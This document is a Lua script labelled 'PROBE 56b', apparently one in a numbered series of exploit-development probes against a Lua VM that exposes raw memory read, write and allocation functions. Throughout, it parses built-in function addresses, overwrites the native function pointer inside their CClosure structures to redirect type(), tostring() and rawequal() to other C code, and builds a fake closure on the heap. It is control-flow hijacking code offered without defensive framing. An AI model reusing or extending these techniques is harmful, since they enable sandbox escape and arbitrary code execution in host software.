-- CRASH_CLASS: MODERATE
-- PROBE 56b: Minimal CClosure redirect — tightest possible write+call+restore
--
-- Context: Both qword and dword writes to type()+0x20 hang when writing
-- a valid function address. 55g's dword write of +1 "worked" only because
-- the misaligned address caused an immediate SIGILL crash.
--
-- Hypothesis: the write DOES land instantly, but something in the Lua VM
-- execution path immediately calls through the modified pointer. If the
-- redirected function blocks/loops with the wrong args, we see a hang.
--
-- Strategy:
--   [A] Write type()+0x20 to tostring's addr, immediately restore, no call
--       If this hangs, the write itself triggers dispatch
--   [B] Try raw memory.write_dword without pcall wrapper
--   [C] Try redirecting tostring() instead of type() — type() may be special
--   [D] Try redirecting rawget() -> rawequal()
--   [E] Build a fake CClosure on heap with modified +0x20, call through it

print("=== PROBE 56b: MINIMAL REDIRECT STRATEGIES ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

-- Gather function info
local type_addr = parse_func_addr(type)
local tostring_addr = parse_func_addr(tostring)
local rawget_addr = parse_func_addr(rawget)
local rawequal_addr = parse_func_addr(rawequal)
local select_addr = parse_func_addr(select)
local pairs_addr = parse_func_addr(pairs)

print("[INFO] Addresses:")
print("  type:     " .. hexval(type_addr))
print("  tostring: " .. hexval(tostring_addr))
print("  rawget:   " .. hexval(rawget_addr))
print("  rawequal: " .. hexval(rawequal_addr))
print("  select:   " .. hexval(select_addr))
print("  pairs:    " .. hexval(pairs_addr))

if not type_addr then
    print("ABORT: no type addr")
    return
end

local type_20_lo = safe_rd(type_addr + 0x20)
local type_20_hi = safe_rd(type_addr + 0x24)
local tostring_20_lo = tostring_addr and safe_rd(tostring_addr + 0x20) or nil
local tostring_20_hi = tostring_addr and safe_rd(tostring_addr + 0x24) or nil
local rawequal_20_lo = rawequal_addr and safe_rd(rawequal_addr + 0x20) or nil
local rawequal_20_hi = rawequal_addr and safe_rd(rawequal_addr + 0x24) or nil

print(string.format("  type +0x20:     lo=0x%08X hi=0x%08X", type_20_lo or 0, type_20_hi or 0))
print(string.format("  tostring +0x20: lo=0x%08X hi=0x%08X", tostring_20_lo or 0, tostring_20_hi or 0))
print(string.format("  rawequal +0x20: lo=0x%08X hi=0x%08X", rawequal_20_lo or 0, rawequal_20_hi or 0))

collectgarbage("stop")

-- ============================================================
-- [A] Write type()+0x20, restore IMMEDIATELY, no function call
-- Tests whether the write itself blocks
-- ============================================================
print("")
print("[A] Write+restore type()+0x20 with NO call in between")
print("  MARKER_A_BEFORE_WRITE")
-- Write low dword to tostring's, then immediately restore
memory.write_dword(type_addr + 0x20, tostring_20_lo)
memory.write_dword(type_addr + 0x20, type_20_lo)
print("  MARKER_A_AFTER_RESTORE")
print("  verify type(42): " .. tostring(type(42)))

-- ============================================================
-- [B] Same but with a call between write and restore
-- ============================================================
print("")
print("[B] Write type()+0x20, call type(42), restore")
print("  MARKER_B_BEFORE_WRITE")
memory.write_dword(type_addr + 0x20, tostring_20_lo)
-- type(42) should now dispatch to tostring's code
local b_result = type(42)
memory.write_dword(type_addr + 0x20, type_20_lo)
print("  MARKER_B_AFTER_RESTORE")
print("  result of redirected type(42): " .. tostring(b_result))
print("  verify type(42): " .. tostring(type(42)))

-- ============================================================
-- [C] Redirect tostring() -> type's C func instead
-- Maybe type() is special (used internally by VM)
-- ============================================================
print("")
print("[C] Redirect tostring() -> type's C func")
if tostring_addr then
    print("  MARKER_C_BEFORE_WRITE")
    memory.write_dword(tostring_addr + 0x20, type_20_lo)
    -- tostring(42) should now behave like type(42) = "number"
    local c_result = tostring(42)
    memory.write_dword(tostring_addr + 0x20, tostring_20_lo)
    print("  MARKER_C_AFTER_RESTORE")
    print("  result of redirected tostring(42): " .. tostring(c_result))
    print("  verify tostring(42): " .. tostring(tostring(42)))
else
    print("  SKIP")
end

-- ============================================================
-- [D] Redirect rawequal() -> rawget's C func
-- Neither is likely used internally by the VM
-- ============================================================
print("")
print("[D] Redirect rawequal() -> rawget's C func")
if rawequal_addr and rawget_addr then
    local rawget_20_lo = safe_rd(rawget_addr + 0x20)
    print("  MARKER_D_BEFORE_WRITE")
    memory.write_dword(rawequal_addr + 0x20, rawget_20_lo)
    -- rawequal(t, "key") should now behave like rawget(t, "key")
    local test_t = {foo = "bar", baz = 123}
    local d_result = rawequal(test_t, "foo")
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    print("  MARKER_D_AFTER_RESTORE")
    print("  result: " .. tostring(d_result))
    print("  verify rawequal(1,1): " .. tostring(rawequal(1,1)))
else
    print("  SKIP")
end

-- ============================================================
-- [E] Build fake CClosure on heap
-- Copy type()'s CClosure structure, modify +0x20 to tostring,
-- then try to make Lua call through our fake object
-- ============================================================
print("")
print("[E] Fake CClosure on heap")
local fake = memory.alloc(0x80)
-- Copy type's full CClosure (80 bytes)
for off = 0, 0x48, 4 do
    local val = safe_rd(type_addr + off)
    if val then safe_wd(fake + off, val) end
end
-- Modify +0x20 to tostring's C function
safe_wd(fake + 0x20, tostring_20_lo)
safe_wd(fake + 0x24, tostring_20_hi or 0)
print("  fake CClosure at: " .. hexval(fake))
print("  fake +0x20: " .. string.format("0x%08X_%08X", safe_rd(fake + 0x24) or 0, safe_rd(fake + 0x20) or 0))
-- The fake object exists but we can't easily make Lua call through it
-- without setting up the GC link or stack frame. Report the structure.
print("  (can't call through fake without stack setup)")

-- ============================================================
-- [F] Test: does print() use type() internally?
-- Write +0x20 to something harmless, try print
-- ============================================================
print("")
print("[F] Does print use type()? Write type +0x20 = tostring, then print a literal")
print("  MARKER_F_BEFORE_WRITE")
memory.write_dword(type_addr + 0x20, tostring_20_lo)
-- Try to print a simple string literal — if print internally calls type(),
-- this will dispatch to tostring instead
print("  MARKER_F_PRINT_TEST_LITERAL")
memory.write_dword(type_addr + 0x20, type_20_lo)
print("  MARKER_F_AFTER_RESTORE")

collectgarbage("restart")

print("")
print("=== PROBE 56b COMPLETE ===")
